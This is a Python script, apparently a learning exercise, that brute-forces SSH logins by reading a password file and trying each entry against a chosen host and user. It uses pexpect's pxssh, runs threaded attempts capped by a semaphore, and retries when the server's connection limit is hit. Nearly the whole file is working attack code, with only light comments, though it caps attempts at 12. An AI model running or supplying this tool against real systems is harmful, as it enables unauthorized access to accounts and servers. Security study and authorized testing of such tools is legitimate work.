import optparse
import time
import threading
import pexpect
from pexpect import pxssh

maxConnections = 5 
connection_lock = threading.BoundedSemaphore(value=maxConnections) 
PROMPT = ['# ', '>>> ', '> ', '\$ ']
Password_Attempt = 0
Password_Found = False 
'''
def send_command(child, cmd):
  global PROMPT
  child.sendline(cmd)
  child.expect(PROMPT)
  print(child.before)

#function to connect using passwrd
def connect(host,user, password):
    #if u r connecting for the first time it will generate newsshkey.
  ssh_newkey = 'Are you sure you want to continue connecting'
  connStr = 'ssh ' + user + '@' + host
  #Create and control child application and pass login commands
  child = pexpect.spawn(connStr)
  #three types of output we defined over here that is timeout, a message indicating host used a new public key, and a prompt for a password
  ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:'])
  #if its timeout it will return 0
  if ret == 0:
    print('[]Error Connecting')
    return
  #Capturing the ssh_newkey message and return 1
  if ret == 1:
    child.sendline('yes')
    ret = child.expect([pexpect.TIMEOUT, '[P|p]assword:'])
    if ret == 0:
      print('Error Connecting')
      return
  child.sendline(password)
  child.expect(PROMPT)
  print('Success Connecting')
  return child
  '''
#brute forcing login using pxssh with a file


def pxssh_send_command(child, cmd):
  child.sendline(cmd)
  child.prompt()
  print(child.before)
#created function to connect using passwrd user and host.
def pxssh_connect(host, user, password, release):
  global Password_Found
  global Password_Attempt
  
  try:
    #setupt counter for passwrds attempt.
    Password_Attempt +=1
    child = pxssh.pxssh()
    child.login(host, user, password)
    print('Password Found: ' + password)
    #indicating password is found by updating boolean to true
    Password_Found = True
    
    
  except pxssh.ExceptionPxssh as e:
      #handling exception if SSH server is maxed out at the number of connections
      if 'read_nonblocking' in str(e):
          #sleep for few seconds    
          time.sleep(5)
          pxssh_connect(host, user, password, False)
       #to handle command prompt error.  
      elif 'if pxssh having difficulty in getting command prompt' in str(e):
          time.sleep(5)
          pxssh_connect(host, user, password, False)
  #now we can relase connection lock        
  finally:
      if release:
        connection_lock.release()

def main():
  global Password_Found
  global Password_Attempt
  #created parser for taking argument from the command line
  parser = optparse.OptionParser('usage prop -H <target host> -U <user> -P <password file>')
  #parser setup for host input
  parser.add_option('-H', dest='tgtHost', type='string', help='specify host')
  #parser setup for host input
  parser.add_option('-U', dest='user', type='string', help='specify user')
  #parser setup for password file input
  parser.add_option('-P', dest='passwdFile', type='string', help='specify password file')
  (options, args) = parser.parse_args()
  host = options.tgtHost
  passwdFile = options.passwdFile
  user = options.user
  if host == None or passwdFile == None or user == None:
    print(parser.usage)
    exit(0)
    #reading our password file
  fn = open(passwdFile, 'r')
  for line in fn.readlines():
      #set a limit for no of passwrd attempt
    if Password_Attempt > 12:
      print('[-]Sorry: Too Many password attempts')
      exit(0)
      
    connection_lock.acquire()
    #printing all the passwrds we were checking in the file.
    password = line.strip('\r').strip('\n')
    print('[+]Testing: ' + str(password))
    t = threading.Thread(target=pxssh_connect, args=(host, user, password, True))
    child = t.start()

if __name__ == '__main__':
  main()